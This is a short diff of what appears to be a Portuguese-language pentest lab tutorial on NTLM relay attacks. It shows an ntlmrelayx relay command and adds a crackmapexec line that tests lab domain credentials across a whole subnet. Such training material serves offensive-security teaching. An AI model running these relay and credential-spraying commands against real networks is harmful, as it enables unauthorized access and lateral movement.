@@ -23,3 +23,4 @@ Por fim, iniciaremos o ntlmrelayx e aguardaremos a ocorrência de um evento.
 
 sudo ntlmrelayx.py –tf targets.txt –smb2support
 
+crackmapexec smb 192.168.28.0/24 -u peter -d MARVEL.local -p Password123
